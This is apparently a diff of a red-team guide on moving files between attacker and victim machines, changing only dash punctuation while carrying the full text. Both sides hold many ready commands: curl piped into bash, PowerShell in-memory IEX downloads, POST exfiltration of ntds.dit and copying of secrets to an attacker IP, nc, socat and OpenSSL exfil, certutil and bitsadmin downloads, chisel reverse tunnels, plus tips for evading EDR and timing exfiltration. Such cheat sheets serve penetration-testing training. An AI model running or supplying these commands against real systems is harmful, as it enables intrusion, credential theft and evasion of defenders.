@@ -10,12 +10,12 @@ difficulty: "Intermediate"
 readTime: "15 mins"
 ---
 
-Moving tools, loot, and implants between machines is one of the most repetitive — and most detection-prone — activities on an engagement. A clean file transfer is often the difference between a quiet beachhead and a tripped EDR. This guide catalogues the techniques I reach for across Linux, Windows, restricted shells, and inspected networks, with an emphasis on **living off the land**, **OPSEC**, and **fallback chains** when your first option gets blocked.
+Moving tools, loot, and implants between machines is one of the most repetitive - and most detection-prone - activities on an engagement. A clean file transfer is often the difference between a quiet beachhead and a tripped EDR. This guide catalogues the techniques I reach for across Linux, Windows, restricted shells, and inspected networks, with an emphasis on **living off the land**, **OPSEC**, and **fallback chains** when your first option gets blocked.
 
 <Callout type="warning" title="OPSEC First">
   Every technique here leaves artifacts: process logs, Sysmon EID 1/3/11, proxy logs, TLS JA3
   hashes, SMB share mounts. Always assume the defender is logging. Prefer native binaries, encode
-  when you must, and rotate methods when a transfer fails — a single failed `certutil` will often
+  when you must, and rotate methods when a transfer fails - a single failed `certutil` will often
   trip your first EDR rule.
 </Callout>
 
@@ -31,7 +31,7 @@ Each code block that involves two or more machines includes a comment at the top
 
 ## Linux-Based Transfers
 
-Linux targets are usually the friendlier side of an engagement. You typically have a real shell, a `curl`/`wget` pair, and outbound network access — though egress filtering, break-glass proxies, and bastion jumps will constrain you. The techniques below progress from the trivial (`curl`) to tunneling through SSH when nothing else is open.
+Linux targets are usually the friendlier side of an engagement. You typically have a real shell, a `curl`/`wget` pair, and outbound network access - though egress filtering, break-glass proxies, and bastion jumps will constrain you. The techniques below progress from the trivial (`curl`) to tunneling through SSH when nothing else is open.
 
 ### curl
 
@@ -45,7 +45,7 @@ curl http://10.10.14.5/linpeas.sh --output /tmp/linpeas.sh
 # Useful when piping directly into bash for a one-liner dropper.
 curl -sS http://10.10.14.5/shell.sh | bash
 
-# Follow redirects (-L) — many redirector chains 301 to a CDN
+# Follow redirects (-L) - many redirector chains 301 to a CDN
 curl -L -o /tmp/agent http://redirector.example.com/beacon
 
 # Resume an interrupted transfer (HTTP Range header)
@@ -64,7 +64,7 @@ curl -X POST http://10.10.14.5/loot \
 
 <Callout type="info">
   `curl` supports `file://`, `gopher://`, and `dict://` out of the box. In SSRF chains these
-  protocols are gold — `gopher://` in particular lets you craft arbitrary TCP payloads against
+  protocols are gold - `gopher://` in particular lets you craft arbitrary TCP payloads against
   internal services (Redis, Memcached, internal SMTP).
 </Callout>
 
@@ -82,13 +82,13 @@ wget http://10.10.14.5/notes.txt -O /tmp/notes.txt
 # -q quiet, no progress; pair with -nv for minimal "name + size" output
 wget -q http://10.10.14.5/agent -O /tmp/agent
 
-# Mirror a directory listing — recurse (-r), no parent (-np), keep dirs (-nd off)
+# Mirror a directory listing - recurse (-r), no parent (-np), keep dirs (-nd off)
 wget -r -np -nH --cut-dirs=2 -P /tmp/loot http://10.10.14.5/share/tools/
 
 # Limit rate to stay under noisy-egress NIDS thresholds
 wget --limit-rate=200k http://10.10.14.5/dump.tar -O /tmp/dump.tar
 
-# Ignore a single broken cert (lab/dev only — never do this in production scope)
+# Ignore a single broken cert (lab/dev only - never do this in production scope)
 wget --no-check-certificate https://10.10.14.5/stage -O /tmp/stage
 ```
 
@@ -111,13 +111,13 @@ scp victim@10.10.10.23:/tmp/passwords.txt /home/kali/passwords.txt
 # Same, with an identity file
 scp -i id_rsa victim@10.10.10.23:/tmp/passwords.txt /home/kali/passwords.txt
 
-# Recursive directory transfer — handy for grabbing entire ~/.ssh or /var/backups
+# Recursive directory transfer - handy for grabbing entire ~/.ssh or /var/backups
 scp -r -i id_rsa victim@10.10.10.23:/var/backups /home/kali/backups/
 
 # Non-default port (e.g. the SSH daemon is on 2222)
 scp -P 2222 victim@10.10.10.23:/etc/passwd /home/kali/passwd
 
-# Preserve timestamps/permissions — important when moving binaries
+# Preserve timestamps/permissions - important when moving binaries
 scp -p exploit.sh victim@10.10.10.23:/tmp/exploit.sh
 ```
 
@@ -138,7 +138,7 @@ rsync -avz -e "ssh -i id_rsa" victim@10.10.10.23:/var/log/apache2/ ./loot/apache
 # Resume a large transfer with --partial; --inplace rewrites in-place
 rsync -avz --partial --inplace ./dump.tar victim@10.10.10.23:/tmp/dump.tar
 
-# Exclude noise — important when grabbing whole filesystems
+# Exclude noise - important when grabbing whole filesystems
 rsync -avz --exclude='*.log' --exclude='/proc/*' --exclude='/sys/*' \
       victim@10.10.10.23:/ ./loot-fs/
 
@@ -164,10 +164,10 @@ When SSH isn't an option but a raw TCP socket is open, `nc` and `socat` give you
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
 
-# Attacker (listener) — writes incoming bytes to loot.tar.gz
+# Attacker (listener) - writes incoming bytes to loot.tar.gz
 nc -lnvp 4444 > loot.tar.gz
 
-# Victim — pipes the file into nc pointed at attacker
+# Victim - pipes the file into nc pointed at attacker
 cat /tmp/loot.tar.gz | nc 10.10.14.5 4444
 
 # Same, but with a deadline so the connection cleanly closes once the file ends
@@ -179,14 +179,14 @@ cat /tmp/loot.tar.gz | nc -q 1 10.10.14.5 4444
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
 
-# Victim (listener) — saves incoming bytes to ./implant
+# Victim (listener) - saves incoming bytes to ./implant
 nc -lnvp 4444 > /tmp/implant
 
-# Attacker — pushes the file
+# Attacker - pushes the file
 nc 10.10.10.23 4444 < ./implant
 ```
 
-#### `socat` — encrypted and more robust
+#### `socat` - encrypted and more robust
 
 `socat` is `nc` with superpowers. You get TLS, fine-grained buffering, and fork modes for multi-connection listeners.
 
@@ -202,7 +202,7 @@ socat - OPENSSL:10.10.14.5:443,verify=0 < /tmp/loot.tar.gz
 
 ## Windows-Based Transfers
 
-On Windows you'll rarely have `curl.exe` pre-installed (though Windows 10 1803+ ships it). The default workflow is to use signed, native binaries that defenders have to allow — `certutil`, `bitsadmin`, PowerShell, and the SMB stack.
+On Windows you'll rarely have `curl.exe` pre-installed (though Windows 10 1803+ ships it). The default workflow is to use signed, native binaries that defenders have to allow - `certutil`, `bitsadmin`, PowerShell, and the SMB stack.
 
 ### certutil.exe
 
@@ -222,7 +222,7 @@ certutil.exe -decode C:\Windows\Temp\payload.b64 C:\Windows\Temp\payload.exe
 certutil.exe -encode C:\Tools\implant.exe C:\Tools\implant.b64
 ```
 
-<Callout type="warning" title="AV/EDR Detection — Read This">
+<Callout type="warning" title="AV/EDR Detection - Read This">
   `certutil -urlcache -f` is one of the most heavily signatured LotL patterns in existence. Defender
   for Endpoint, CrowdStrike, and SentinelOne all flag it by default. If you must use it: - Strip the
   `.exe` from your URL (e.g. `/agent.jpg`) - Use a redirector with a legitimate-looking `User-Agent`
@@ -232,7 +232,7 @@ certutil.exe -encode C:\Tools\implant.exe C:\Tools\implant.b64
 
 ### bitsadmin
 
-`bitsadmin` is the BITS (Background Intelligent Transfer Service) CLI. BITS runs as a service and queues transfers — meaning your download survives user logoff and is throttled based on network cost. It's slower than other methods but blends well with legitimate Windows Update traffic.
+`bitsadmin` is the BITS (Background Intelligent Transfer Service) CLI. BITS runs as a service and queues transfers - meaning your download survives user logoff and is throttled based on network cost. It's slower than other methods but blends well with legitimate Windows Update traffic.
 
 ```powershell
 # Create a transfer job, add a file, resume, complete
@@ -254,14 +254,14 @@ bitsadmin /complete myjob
 ```
 
 <Callout type="info">
-  BITS is asynchronous — `bitsadmin /transfer` blocks, but `/create` + `/addfile` + `/resume`
+  BITS is asynchronous - `bitsadmin /transfer` blocks, but `/create` + `/addfile` + `/resume`
   returns immediately. Use `/info` or `/getstate` to poll, and remember to call `/complete` or the
   job lingers in the queue (defender-visible via `Get-BitsTransfer`).
 </Callout>
 
 ### PowerShell
 
-PowerShell is the most flexible native option and is present on every modern Windows host. The trade-off: Script Block Logging (EID 4104) and AMSI will see everything you run. Obfuscation is out of scope here — assume your commands are logged.
+PowerShell is the most flexible native option and is present on every modern Windows host. The trade-off: Script Block Logging (EID 4104) and AMSI will see everything you run. Obfuscation is out of scope here - assume your commands are logged.
 
 #### `Invoke-WebRequest` (alias `iwr`, `curl`, `wget`)
 
@@ -269,11 +269,11 @@ PowerShell is the most flexible native option and is present on every modern Win
 # Basic download to disk
 Invoke-WebRequest -Uri http://10.10.14.5/agent.exe -OutFile C:\Windows\Temp\agent.exe
 
-# Aliases work too — these all behave the same in PS 5+
+# Aliases work too - these all behave the same in PS 5+
 iwr http://10.10.14.5/agent.exe -OutFile agent.exe
 curl http://10.10.14.5/agent.exe -OutFile agent.exe   # PS alias, NOT the real curl.exe
 
-# In-memory execution — never touches disk, runs in current PowerShell process
+# In-memory execution - never touches disk, runs in current PowerShell process
 IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')
 
 # Same idea, with IWR (.Content gets the raw string)
@@ -288,14 +288,14 @@ Invoke-WebRequest -Uri http://10.10.14.5/agent.exe `
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 Invoke-WebRequest -Uri https://10.10.14.5/stage -OutFile stage.exe
 
-# POST exfil — ship a file's bytes as the body
+# POST exfil - ship a file's bytes as the body
 Invoke-WebRequest -Uri http://10.10.14.5/exfil `
     -Method POST `
     -Body ([System.IO.File]::ReadAllBytes('C:\Users\admin\ntds.dit')) `
     -ContentType "application/octet-stream"
 ```
 
-#### `Net.WebClient` — older, often less-instrumented than IWR
+#### `Net.WebClient` - older, often less-instrumented than IWR
 
 ```powershell
 # Download to disk
@@ -304,7 +304,7 @@ Invoke-WebRequest -Uri http://10.10.14.5/exfil `
 # Download string into memory (then IEX it for in-memory execution)
 (New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1') | IEX
 
-# Download data as a byte array — useful for manually writing to disk or memory
+# Download data as a byte array - useful for manually writing to disk or memory
 $bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/shellcode.bin')
 [System.IO.File]::WriteAllBytes('C:\Windows\Temp\sc.bin', $bytes)
 
@@ -313,7 +313,7 @@ $wc = New-Object Net.WebClient
 $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
 $wc.DownloadFile('http://10.10.14.5/agent.exe', 'agent.exe')
 
-# Use a non-default proxy (in enterprise environments — explicit proxy is common)
+# Use a non-default proxy (in enterprise environments - explicit proxy is common)
 $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
 $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
 $wc.DownloadFile('http://10.10.14.5/agent.exe', 'agent.exe')
@@ -327,17 +327,17 @@ $wc.DownloadFile('http://10.10.14.5/agent.exe', 'agent.exe')
 
 ### SMB File Transfers (Impacket's `smbserver.py`)
 
-SMB is **the** protocol of locked-down AD environments. Domain-joined hosts already speak SMB to DCs for SYSVOL, Group Policy, and authentication — your transfer blends right in. The cleanest setup is `smbserver.py` from Impacket on your attacker box, then `copy` from the Windows side.
+SMB is **the** protocol of locked-down AD environments. Domain-joined hosts already speak SMB to DCs for SYSVOL, Group Policy, and authentication - your transfer blends right in. The cleanest setup is `smbserver.py` from Impacket on your attacker box, then `copy` from the Windows side.
 
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
 
-# Attacker — spin up an anonymous-read SMB share named "share"
+# Attacker - spin up an anonymous-read SMB share named "share"
 # serving the current directory. bind to all interfaces.
 impacket-smbserver share ./ -smb2support
 
 # Better OPSEC: require a username/password (anonymous SMB is very noisy
-# in Windows event logs — EID 4624 type 3 with NULL session is high-signal)
+# in Windows event logs - EID 4624 type 3 with NULL session is high-signal)
 impacket-smbserver share ./ -smb2support -username offsec -password 'Sup3r!P@ss'
 
 # Even better: serve over SMB2 only, on a non-standard port via a redirector
@@ -347,7 +347,7 @@ impacket-smbserver share ./ -smb2support -username offsec -password 'Sup3r!P@ss'
 ```powershell
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
 
-# Victim — mount the share (with creds matching the server above)
+# Victim - mount the share (with creds matching the server above)
 net use \\10.10.14.5\share /USER:offsec 'Sup3r!P@ss'
 
 # Copy a file FROM attacker TO victim
@@ -356,7 +356,7 @@ copy \\10.10.14.5\share\agent.exe C:\Windows\Temp\agent.exe
 # Copy a file FROM victim TO attacker (exfil)
 copy C:\Users\admin\Desktop\secrets.txt \\10.10.14.5\share\loot\secrets.txt
 
-# Unmount when done — leaves a cleaner trail
+# Unmount when done - leaves a cleaner trail
 net use \\10.10.14.5\share /delete
 
 # Anonymous read-only (matches the simpler smbserver invocation above)
@@ -392,7 +392,7 @@ python -m SimpleHTTPServer 8000
 ### PHP
 
 ```bash
-# Built-in PHP server — works great for serving small PHP exfil endpoints
+# Built-in PHP server - works great for serving small PHP exfil endpoints
 php -S 0.0.0.0:8000
 
 # From a specific directory
@@ -422,8 +422,8 @@ ruby -run -e httpd . -p 8000 -b 10.10.14.5
 # One-liner using HTTP::Server::Simple (if installed)
 perl -MHTTP::Server::Simple::CGI -e 'HTTP::Server::Simple::CGI->new(8000)->run'
 
-# Pure-Perl back-to-basics — no modules, just listen + fork + print
-# Serves ./ on port 8000. No MIME types, no chunked encoding — minimal but works.
+# Pure-Perl back-to-basics - no modules, just listen + fork + print
+# Serves ./ on port 8000. No MIME types, no chunked encoding - minimal but works.
 perl -MIO::Socket::INET -e '
   $s = IO::Socket::INET->new(LocalAddr=>"0.0.0.0:8000", Listen=>5, Reuse=>1) or die $!;
   while ($c = $s->accept) {
@@ -448,7 +448,7 @@ Sometimes the only channel you have is a clipboard, a web terminal, or a serial 
 
 ### Base64 Round-Trip
 
-#### On the attacker side — encode the file
+#### On the attacker side - encode the file
 
 ```bash
 # Encode a binary to base64 text, single line (good for paste buffers)
@@ -461,14 +461,14 @@ cat implant.b64
 tar czf - ./tools/ | base64 -w 0 > tools.b64
 ```
 
-#### On the victim (Linux) — decode it back
+#### On the victim (Linux) - decode it back
 
 ```bash
 # Echo the base64 blob into base64 -d
 echo 'f0VMRgIBAAA...' | base64 -d > /tmp/implant
 chmod +x /tmp/implant
 
-# Or write it to a file first (cleaner for large blobs — paste might wrap)
+# Or write it to a file first (cleaner for large blobs - paste might wrap)
 cat > /tmp/implant.b64 << 'EOF'
 f0VMRgIBAAA...
 EOF
@@ -476,7 +476,7 @@ base64 -d /tmp/implant.b64 > /tmp/implant
 chmod +x /tmp/implant
 ```
 
-#### On the victim (Windows / PowerShell) — decode it
+#### On the victim (Windows / PowerShell) - decode it
 
 ```powershell
 # Stage the base64 string into a variable, then decode to bytes
@@ -488,7 +488,7 @@ $b64 = Get-Content C:\Windows\Temp\agent.b64 -Raw
 [IO.File]::WriteAllBytes('C:\Windows\Temp\agent.exe', [Convert]::FromBase64String($b64))
 ```
 
-#### On the victim (Windows / `certutil` — no PowerShell needed)
+#### On the victim (Windows / `certutil` - no PowerShell needed)
 
 ```cmd
 certutil -decode C:\Windows\Temp\agent.b64 C:\Windows\Temp\agent.exe
@@ -499,31 +499,31 @@ certutil -decode C:\Windows\Temp\agent.b64 C:\Windows\Temp\agent.exe
 On stripped appliances (`busybox` without `base64`), `xxd` or `od` can fill in.
 
 ```bash
-# Attacker — encode as hex
+# Attacker - encode as hex
 xxd -p implant.exe | tr -d '\n' > implant.hex
 
-# Victim (Linux) — decode
+# Victim (Linux) - decode
 echo '4d5a90...' | xxd -r -p > /tmp/implant
 chmod +x /tmp/implant
 ```
 
 ## Encrypted / Evasive Transfers
 
-Clear-text HTTP/SMB transfers are trivially inspectable. Even HTTPS can be blocked by TLS-intercepting proxies (and your C2 cert won't pass their trust store). The techniques below use **end-to-end encryption you control** — the proxy sees encrypted bytes it cannot MITM.
+Clear-text HTTP/SMB transfers are trivially inspectable. Even HTTPS can be blocked by TLS-intercepting proxies (and your C2 cert won't pass their trust store). The techniques below use **end-to-end encryption you control** - the proxy sees encrypted bytes it cannot MITM.
 
 ### OpenSSL
 
 OpenSSL's `s_client` / `s_server` pair gives you a poor-man's encrypted tunnel with no extra tooling. Generate a self-signed cert once, then use it for both directions.
 
-#### One-time setup — generate a self-signed cert on the attacker
+#### One-time setup - generate a self-signed cert on the attacker
 
 ```bash
-# Generates cert.pem and key.pem — both stay on the attacker side
+# Generates cert.pem and key.pem - both stay on the attacker side
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
     -subj "/CN=cdn.example.com"
 ```
 
-#### Attacker — listen for encrypted transfer
+#### Attacker - listen for encrypted transfer
 
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
@@ -535,18 +535,18 @@ openssl s_server -accept 443 -cert cert.pem -key key.pem -quiet > loot.tar.gz
 openssl s_server -accept 443 -cert cert.pem -key key.pem -quiet < implant.exe
 ```
 
-#### Victim — push file to attacker over TLS
+#### Victim - push file to attacker over TLS
 
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
 
 # Verify=0 disables cert validation (we're using a self-signed cert).
-# Don't ship verify=0 in production-credible infrastructure — but for an
+# Don't ship verify=0 in production-credible infrastructure - but for an
 # offensive transfer it's fine and expected.
 cat /tmp/loot.tar.gz | openssl s_client -connect 10.10.14.5:443 -quiet
 ```
 
-#### Victim — pull file from attacker over TLS
+#### Victim - pull file from attacker over TLS
 
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
@@ -558,7 +558,7 @@ openssl s_client -connect 10.10.14.5:443 -quiet > /tmp/implant.exe
 
 [Chisel](https://github.com/jpillora/chisel) is a single-binary TCP/UDP tunnel over WebSocket, with optional TLS. It's the modern replacement for `ptunnel`/` iodine`/`stunnel` combos and is the first thing I reach for when only HTTPS (443) egress is allowed.
 
-#### Attacker — run the server
+#### Attacker - run the server
 
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
@@ -566,27 +566,27 @@ openssl s_client -connect 10.10.14.5:443 -quiet > /tmp/implant.exe
 # Plain WS, port 8000 (use this only in labs)
 ./chisel server -p 8000 --reverse
 
-# With TLS — wrap WS in a self-signed cert. Pair with --auth for shared-secret.
+# With TLS - wrap WS in a self-signed cert. Pair with --auth for shared-secret.
 openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=cdn.example.com"
 ./chisel server --tls-key key.pem --tls-cert cert.pem -p 8443 --reverse --auth offsec:Sup3rP@ss
 ```
 
-#### Victim — run the client and bring up tunnels
+#### Victim - run the client and bring up tunnels
 
 ```bash
 # KALI_IP  = 10.10.14.5  (attacker)  |  VICTIM_IP = 10.10.10.23  (target)
 # INTERNAL_IP = 10.10.20.5  (host behind the victim)
 
-# Reverse SOCKS5 — proxy traffic OUT of the victim's network via the attacker
+# Reverse SOCKS5 - proxy traffic OUT of the victim's network via the attacker
 ./chisel client --auth offsec:Sup3rP@ss https://10.10.14.5:8443 R:1080:socks
 
-# Reverse port forward — expose victim's RDP on attacker's 3389
+# Reverse port forward - expose victim's RDP on attacker's 3389
 ./chisel client --auth offsec:Sup3rP@ss https://10.10.14.5:8443 R:3389:127.0.0.1:3389
 
-# Local port forward — forward a port ON the victim to an internal host
+# Local port forward - forward a port ON the victim to an internal host
 ./chisel client --auth offsec:Sup3rP@ss https://10.10.14.5:8443 8080:10.10.20.5:80
 
-# Combine many forwards in one client — single TLS session, multiple tunnels
+# Combine many forwards in one client - single TLS session, multiple tunnels
 ./chisel client --auth offsec:Sup3rP@ss https://10.10.14.5:8443 \
     R:1080:socks \
     R:3389:127.0.0.1:3389 \
@@ -612,14 +612,14 @@ proxychains smbclient //10.10.20.5/c$ -U 'admin' -N
 
 A few habits that have saved me more than once:
 
-- **Rotate methods.** Don't `certutil` your way through every host in a domain — once one transfer gets caught, every subsequent `certutil` invocation will be correlated.
+- **Rotate methods.** Don't `certutil` your way through every host in a domain - once one transfer gets caught, every subsequent `certutil` invocation will be correlated.
 - **Time your transfers.** Align exfil windows with normal business-hour activity. A 2 AM SMB push to an unknown host is an instant anomaly.
-- **Use redirectors.** Your attacker IP should never appear in victim logs directly. Cloudflare, fastly, a cheap VPS with nginx in front — all work.
+- **Use redirectors.** Your attacker IP should never appear in victim logs directly. Cloudflare, fastly, a cheap VPS with nginx in front - all work.
 - **Test for breakage before relying on it.** Many of these techniques have host-specific quirks (PowerShell Constrained Language Mode, AppLocker on `certutil`, SELinux denying `nc` bind). Have at least one fallback in each category.
 - **Clean up.** `net use /delete`, `bitsadmin /complete`, kill the `http.server` process, delete staged `.b64` blobs. Persistence is great; sloppiness is not.
 
 <Callout type="note" title="Final Word">
   File transfer is infrastructure. The technique you pick matters less than the discipline of
-  picking the right one for the environment you're in — and being ready to switch the moment the
+  picking the right one for the environment you're in - and being ready to switch the moment the
   network pushes back.
 </Callout>
